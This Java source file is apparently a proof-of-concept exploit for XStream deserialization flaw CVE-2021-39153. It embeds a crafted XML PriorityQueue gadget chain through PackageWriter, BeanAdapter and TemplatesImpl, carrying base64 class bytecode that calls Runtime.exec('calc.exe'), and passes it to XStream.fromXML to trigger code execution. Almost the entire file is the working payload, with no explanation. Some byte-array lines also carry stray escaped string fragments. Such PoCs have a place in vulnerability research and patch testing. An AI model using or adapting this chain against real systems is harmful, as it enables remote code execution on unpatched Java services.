package com.r17a.xstream.cve.priorityqueue;

import com.thoughtworks.xstream.XStream;
//import com.sun.java.util.jar.pack.PackageWriter;


public class CVE_2021_39153 {
    public static void main(String[] args) {
        String xml = "<java.util.PriorityQueue serialization='custom'>\n" +
                "  <unserializable-parents/>\n" +
                "  <java.util.PriorityQueue>\n" +
                "    <default>\n" +
                "      <size>2</size>\n" +
                "      <comparator class='com.sun.java.util.jar.pack.PackageWriter$2'>\n" +
                "        <outer-class>\n" +
                "          <verbose>0</verbose>\n" +
                "          <effort>0</effort>\n" +
                "          <optDumpBands>false</optDumpBands>\n" +
                "          <optDebugBands>false</optDebugBands>\n" +
                "          <optVaryCodings>false</optVaryCodings>\n" +
                "          <optBigStrings>false</optBigStrings>\n" +
                "          <isReader>false</isReader>\n" +
                "          <bandHeaderBytePos>0</bandHeaderBytePos>\n" +
                "          <bandHeaderBytePos0>0</bandHeaderBytePos0>\n" +
                "          <archiveOptions>0</archiveOptions>\n" +
                "          <archiveSize0>0</archiveSize0>\n" +
                "          <archiveSize1>0</archiveSize1>\n" +
                "          <archiveNextCount>0</archiveNextCount>\n" +
                "          <attrClassFileVersionMask>0</attrClassFileVersionMask>\n" +
                "          <attrIndexTable class='com.sun.javafx.fxml.BeanAdapter'>\n" +
                "            <bean class='com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl' serialization='custom'>\n" +
                "              <com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl>\n" +
                "                <default>\n" +
                "                  <__name>Pwnr</__name>\n" +
                "                  <__bytecodes>\n" +
                "                    <byte-array>yv66vgAAADIAOQoAAwAiBwA3BwAlBwAmAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBa0gk/OR3e8+AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAMSW5uZXJDbGFzc2VzAQA1THlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5bG9hZDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAJwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAoAQAzeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cwEACDxjbGluaXQ+AQARamF2YS9sYW5nL1J1bnRpbWUHACoBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7DAAsAC0KACsALgEACGNhbGMuZXhlCAAwAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAMgAzCgArADQBAA1TdGFja01hcFRhYmxlAQAeeXNvc2VyaWFsL1B3bmVyNDE2NTkyOTE1MTgwNjAwAQAgTHlzb3NlcmlhbC9Qd25lcjQxNjU5MjkxNTE4MDYwMDsAIQACAAMAAQAEAAEAGgAFAAYAAQAHAAAAAgAIAAQAAQAKAAsAAQAMAAAALwABAAEAAAAFKrcAAbEAAAACAA0AAAAGAAEAAAAvAA4AAAAMAAEAAAAFAA8AOAAAAAEAEwAUAAIADAAAAD8AAAADAAAAAbEAAAACAA0AAAAGAAEAAAA0AA4AAAAgAAMAAAABAA8AOAAAAAAAAQAVABYAAQAAAAEAFwAYAAIAGQAAAAQAAQAaAAEAEwAbAAIADAAAAEkAAAAEAAAAAbEAAAACAA0AAAAGAAEAAAA4AA4AAAAqAAQAAAABAA8AOAAAAAAAAQAVABYAAQAAAAEAHAAdAAIAAAABAB4AHwADABkAAAAEAAEAGgAIACkACwABAAwAAAAkAAMAAgAAAA+nAAMBTLgALxIxtgA1V7EAAAABADYAAAADAAEDAAIAIAAAAAIAIQARAAAACgABAAIAIwAQAAk=</byte-array>\\n\" +\n" +
                "                    <byte-array>yv66vgAAADIAGwoAAwAVBwAXBwAYBwAZAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBXHmae48bUcYAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAANGb28BAAxJbm5lckNsYXNzZXMBACVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb287AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAaAQAjeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb28BABBqYXZhL2xhbmcvT2JqZWN0AQAUamF2YS9pby9TZXJpYWxpemFibGUBAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAABAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAAPAAOAAAADAABAAAABQAPABIAAAACABMAAAACABQAEQAAAAoAAQACABYAEAAJ</byte-array>\\n\" +\n" +
                "                  </__bytecodes>\n" +
                "                  <__transletIndex>-1</__transletIndex>\n" +
                "                  <__indentNumber>0</__indentNumber>\n" +
                "                </default>\n" +
                "              </com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl>\n" +
                "            </bean>\n" +
                "            <localCache>\n" +
                "              <methods>\n" +
                "                <entry>\n" +
                "                  <string>getOutputProperties</string>\n" +
                "                  <list>\n" +
                "                    <method>\n" +
                "                      <class>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</class>\n" +
                "                      <name>getOutputProperties</name>\n" +
                "                      <parameter-types/>\n" +
                "                    </method>\n" +
                "                  </list>\n" +
                "                </entry>\n" +
                "              </methods>\n" +
                "            </localCache>\n" +
                "          </attrIndexTable>\n" +
                "          <shortCodeHeader__h__limit>0</shortCodeHeader__h__limit>\n" +
                "        </outer-class>\n" +
                "      </comparator>\n" +
                "    </default>\n" +
                "    <int>3</int>\n" +
                "    <string-array>\n" +
                "      <string>yxxx</string>\n" +
                "      <string>outputProperties</string>\n" +
                "    </string-array>\n" +
                "    <string-array>\n" +
                "      <string>yxxx</string>\n" +
                "    </string-array>\n" +
                "  </java.util.PriorityQueue>\n" +
                "</java.util.PriorityQueue>";
        XStream xstream = new XStream();
        xstream.fromXML(xml);
    }
}
